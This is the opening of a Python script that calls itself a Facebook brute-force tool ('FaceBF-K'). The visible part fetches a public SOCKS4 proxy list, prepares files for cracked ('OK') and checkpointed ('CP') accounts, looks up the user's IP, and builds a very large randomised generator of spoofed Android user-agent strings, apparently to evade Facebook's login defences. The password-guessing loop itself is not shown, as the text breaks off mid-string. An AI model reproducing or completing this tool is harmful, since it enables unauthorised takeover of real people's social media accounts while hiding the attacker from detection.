#! usr/bin/python3

# <------[ Import Module ]------->
import requests, bs4, json, os, sys, random, datetime, time, re, rich, calendar, sys, subprocess, logging, uuid, base64
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import strftime
from time import sleep
from rich import print as coy
from rich.panel import Panel as nel 
from rich.tree import Tree
from rich.columns import Columns
from rich.console import Console as Wagyo
console = Wagyo()

# <-------[ Generate - Proxy ]------->
try:
  prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
  open('.prox.txt','w').write(prox)
except Exception as e:
  print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mERROR NOT FOUND 404 | No Internet !')
prox=open('.prox.txt','r').read().splitlines()

# <-------[ Global Name]------->
id, id2 =  [], []
ualu, ualuh = [], []
pwpluss, pwnya = [], []
tokenku, method = [], []
loop, ok, cp = 0, 0, 0
ses = requests.Session()
sys.stdout.write('\x1b]2; FaceBF-K | Facebook Brute Force By KyyXD\x07')

# <-------[ Color ]------->
rc = random.choice
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
N = '\x1b[0m'    
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
warna = rc([
  A,R,Y,G,B,G1,G2,G3,G4,G5,X,X1,X2,X3,X4,X5,S,M
  ])

# <-------[ Color 2 ]------->
M2, H2, K2, P2, B2, U2, O2, C2, J2 = ["[#FF0000]", "[#00FF00]", "[#FFFF00]", "[#FFFFFF]", "[#1e00ff]", "[#b900ff]", "[#EB6000]", "[#00fbff]", "[#ff14cf]"]
acak = [M2, H2, K2, B2, U2, O2, P2, C2, J2]
warna2 = random.choice(acak)
til =f"{M2}● {K2}● {H2}●"
ken = f'{M2}›{K2}›{H2}› '
tod = f' {H2}‹{K2}‹{M2}‹'

# <-------[ Time ]------->
bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
tgl = datetime.now().day
bln = bulan[(str(datetime.now().month))]
thn = datetime.now().year
tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
waktu = strftime('%H:%M:%S')
hari = datetime.now().strftime("%A")
rok = f'{H2}OK{P2}-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
rcp = f'{K2}CP{P2}-'+str(tgl)+'-'+str(bln)+'-' +str(thn)+'.txt'
okc = f'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = f'CP-'+str(tgl)+'-'+str(bln)+'-' +str(thn)+'.txt'

# <-------[ Get IP - Country ]------->
ipaddr = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]

#<-[ Convert-Cookies ]->#
#def Konversi(cookie):
#	cok = ('datr=%s;fr=%s;c_user=%s;xs=%s'%(cookie['datr'],cookie['fr'],cookie['c_user'],cookie['xs']))
#	return(str(cok))
# <-------[ User-Agent ]------->
def Ugen():
	a = random.choice(["7","8","9","10","12","13","14","6.0","7.0","8.0","9.0","7.1.1","8.0.0","8.1.0",f"{str(random.randint(5,9))}.0.0",f"{str(random.randint(5,9))}.0.1",f"{str(random.randint(5,9))}.1.1",f"{str(random.randint(5,9))}.1.{str(random.randint(0,1))}",f"{str(random.randint(5,9))}.0",str(random.randint(5,14))])
	b = random.choice(["LRX22C","LRX21V","LRX22G","LMY47I","LMY47V","OPM1","OPR1","O11019","TPR1","TP1A","RP1A","PPR1","PKQ1","QQ1A","QP1A","SKQ1","SP1A","RKQ1","RQ1A","QKQ1","TKQ1"])
	c = random.randrange(130000,230000)
	d = random.randrange(10,32)
	e = random.randrange(80,120)
	f = '0'
	g = random.randrange(4200,6200)
	h = random.randrange(70,200)
	i = random.choice(['MZ-m1 note','MZ-m2 note','MZ-M3s','MZ-M3','MZ-M5s','MZ-M3 Max','MZ-m3 note','MZ-MX4','MZ-U20','MZ-MX4 Pro','MZ-PRO 5','MZ-U10','MZ-M5c','MZ-meizu M8 lite','MZ-mmm52','MZ-Meizu S6','MZ-M3 Max','MZ-M1 E','MZ-meizu note9','MZ-16 X','MZ-16th Plus','MZ-15 Plus','MZ-16T','MZ-M6','MZ-PRO 7 Plus','MZ-m1 metal','MZ-16s Pro','MZ-M5 Note','MZ-Meizu 6T','MZ-16 X','MZ-16th','MZ-MEIZU 18X','MZ-MEIZU 18s','MZ-M1822','MZ-meizu 17','MZ-meizu 17 Pro','MZ-MEIZU 18 Pro','MZ-TYH212U','MZ-MEIZU 20','MZ-MEIZU 20 Pro','Meizu C3','MZ-ZTE T660','ZTE BLADE 8'])
	j = random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921'])
	k = random.choice(['CPH1869','CPH1929','CPH2107','CPH2238','CPH2389','CPH2401','CPH2407','CPH2413','CPH2415','CPH2417','CPH2419','CPH2455','CPH2459','CPH2461','CPH2471','CPH2473','CPH2477','CPH8893','CPH2321','CPH2341','CPH2373','CPH2083','CPH2071','CPH2077','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH1923','CPH1925','CPH1837','CPH2015','CPH2073','CPH2081','CPH2029','CPH2031','CPH2137','CPH1605','CPH1803','CPH1853','CPH1805','CPH1809','CPH1851','CPH1931','CPH1959','CPH1933','CPH1935','CPH1943','CPH2061','CPH2069','CPH2127','CPH2131','CPH2139','CPH2135','CPH2239','CPH2195','CPH2273','CPH2325','CPH2309','CPH1701','CPH2387','CPH1909','CPH1920','CPH1912','CPH1901','CPH1903','CPH1905','CPH1717','CPH1801','CPH2067','CPH2099','CPH2161','CPH2219','CPH2197','CPH2263','CPH2375','CPH2339','CPH1715','CPH2385','CPH1729','CPH1827','CPH1938','CPH1937','CPH1939','CPH1941','CPH2001','CPH2021','CPH2059','CPH2121','CPH2123','CPH2203','CPH2333','CPH2365','CPH1913','CPH1911','CPH1915','CPH1969','CPH2209','CPH1987','CPH2095','CPH2119','CPH2285','CPH2213','CPH2223','CPH2363','CPH1609','CPH1613','CPH1723','CPH1727','CPH1725','CPH1819','CPH1821','CPH1825','CPH1881','CPH1823','CPH1871','CPH1875','CPH2023','CPH2005','CPH2025','CPH2207','CPH2173','CPH2307','CPH2305','CPH2337','CPH1955','CPH1707','CPH1719','CPH1721','CPH1835','CPH1831','CPH1833','CPH1879','CPH1893','CPH1877','CPH1607','CPH1611','CPH1917','CPH1919','CPH1907','CPH1989','CPH1945','CPH1951','CPH2043','CPH2035','CPH2037','CPH2036','CPH2009','CPH2013','CPH2113','CPH2091','CPH2125','CPH2109','CPH2089','CPH2065','CPH2159','CPH2145','CPH2205','CPH2201','CPH2199','CPH2217','CPH1921','CPH2211','CPH2235','CPH2251','CPH2249','CPH2247','CPH2237','CPH2371','CPH2293','CPH2353','CPH2343','CPH2359','CPH2357','CPH2457','CPH1983','CPH1979','oppo f 5 plus','OPPO F1','OPPO F1 Plus','PEPM00','PEDM00','PCHM10','PCLM10','PCCM00','PDBM00','OPPO PBBM30','OPPO A31','OPPO F1s','A31','OPPO R11s','OPPO A37m'])
	l = random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X676B','Infinix X687','Infinix X609','Infinix X697','Infinix X680D','Infinix X507','Infinix X605','Infinix X668','Infinix X6815B','Infinix X624','Infinix X655F','Infinix X689C','Infinix X608','Infinix X698','Infinix X682C','Infinix X688C','Infinix X689B','Infinix X689','Infinix X689D','Infinix X662','Infinix X662B','Infinix X675','Infinix X6812B','Infinix X6812','Infinix X6817B','Infinix X6817','Infinix X6816C','Infinix X6816','Infinix X6816D','Infinix X668C','Infinix X665B','Infinix X665E','Infinix X510','Infinix X559C','Infinix X559F','Infinix X559','Infinix X606','Infinix X606C','Infinix X606D','Infinix X623','Infinix X624B','Infinix X625C','Infinix X625D','Infinix X625B','Infinix X650D','Infinix X650B','Infinix X650','Infinix X650C','Infinix X655C','Infinix X655D','Infinix X680B','Infinix X573','Infinix X573B','Infinix X622','Infinix X693','Infinix X695C','Infinix X695D','Infinix X695','Infinix X663B','Infinix X663','Infinix X670','Infinix X671','Infinix X671B','Infinix X672','Infinix X6819','Infinix X572','Infinix X572-LTE','Infinix X571','Infinix X604','Infinix X610B','Infinix X690','Infinix X690B','Infinix X656','Infinix X692','Infinix X683','Infinix X450','Infinix X5010','Infinix X501','Infinix X401','Infinix X626','Infinix X626B','Infinix X652','Infinix X652A','Infinix X652B','Infinix X652C','Infinix X660B','Infinix X660C','Infinix X660','Infinix X5515','Infinix X5515F','Infinix X5515I','Infinix X609B','Infinix X5514D','Infinix X5516B','Infinix X5516C','Infinix X627','Infinix X680','Infinix X653','Infinix X653C','Infinix X657','Infinix X657B','Infinix X657C','Infinix X6511B','Infinix X6511E','Infinix X6511','Infinix X6512','Infinix X6823C','Infinix X612B','Infinix X612','Infinix X503','Infinix X511','Infinix X352','Infinix X351','Infinix X530','Infinix X676C','Infinix X6821','Infinix X6823','Infinix X6827','Infinix X509','Infinix X603','Infinix X6815','Infinix X620B','Infinix X620','Infinix X687B','Infinix X6811B','Infinix X6810','Infinix X6811',f"Infinix X{str(random.randint(550,699))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(5511,5516))}{random.choice(['B','C','D','E','F',''])}",f"Infinix X{str(random.randint(6711,6899))}{random.choice(['B','C','D','E','F',''])}"])
	m = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','G-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750','GT-I9300','TECNO CD8','itel L6005','itel L6501','TECNO KE7','TECNO IN2','TECNO CD6j','TECNO BD2p','TECNO KD7h','TECNO LA7','itel W6004','MobiGo2','TECNO LC6','TECNO KB7j','itel S661W','TB300FU','S96GT','ZTE A2023G','OPPO A79kt','TECNO CI7n','MP1718','V2154A','SAMSUNG SM-M346B','itel S663L','CHL-AL00','vivo Z3x','CHL-AL00','ivvi P60(i8)'])
	n = random.choice([f'{str(random.randint(10,18))}_{str(random.randint(0,9))}_{str(random.randint(0,9))}',f'{str(random.randint(10,18))}_{str(random.randint(0,9))}'])
	o = random.choice(["en-us","en-gb","id-id","de-de","ru-ru","en-sg","my-sg","fr-fr","fa-ir","ja-jp","pt-br","cs-cz","zh-hk","zh-cn","vi-vn","en-ph","en-in","tr-tr","es-es","it-it","zh-tw"])
	z = random.choice([
		f"Mozilla/5.0 (Linux; U; Android {a}; {o}; {i} Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h}{random.choice([f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,20))}.110-{str(random.randint(2000000000,2029999999))} UWS/2.15.0.4',f' MZBrowser/{str(random.randint(6,8))}.{str(random.randint(0,10))}.{str(random.randint(0,10))} UWS/2.15.0.2',f' MZBrowser/{str(random.randint(8,10))}.{str(random.randint(0,20))}.{str(random.randint(0,20))}',f' MQQBrowser/{str(random.randint(4,10))}.{str(random.randint(0,9))}',f' UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(100,1299))}'])} Mobile Safari/537.36",
		f"Mozilla/5.0 (Linux; Android {a}; {j} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {k} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' [FB_IAB/Orca-Android;FBAV/{str(random.randint(400,439))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f' EdgA/{str(random.randint(30,129))}.0.{str(random.randint(1100,1299))}.{str(random.randint(10,99))}',f' Edg/{str(random.randint(73,129))}.0.{str(random.randint(1200,2999))}.{str(random.randint(73,250))}',f' baiduboxapp/4.8 (Baidu; P1 4.1.2)',f' GNews Android/2022166490',''])}",
		f"Mozilla/5.0 (Linux; Android {a}; {l} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.{f}.{g}.{h} Mobile Safari/537.36{random.choice(['',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 10) NABar/1.0',f' OPR/{str(random.randint(20,50))}.{str(random.randint(0,1))}.{str(random.randint(1000,4999))}.{str(random.randint(70000,209999))}',f' OPR/{str(random.randint(50,80))}.{str(random.randint(0,1))}.{str(random.randint(1000,6999))}.{str(random.randint(10000,69999))}',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm64',f' GSA/{str(random.randint(5,14))}.{str(random.randint(1,50))}.{str(random.randint(1,40))}.{str(random.randint(1,30))}.arm',f' [FB_IAB/FB4A;FBAV/{str(random.randint(400,449))}.0.0.{str(random.randint(0,49))}.{str(random.randint(0,249))};]',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(random.randint(300,389))}.0.0.{str(rando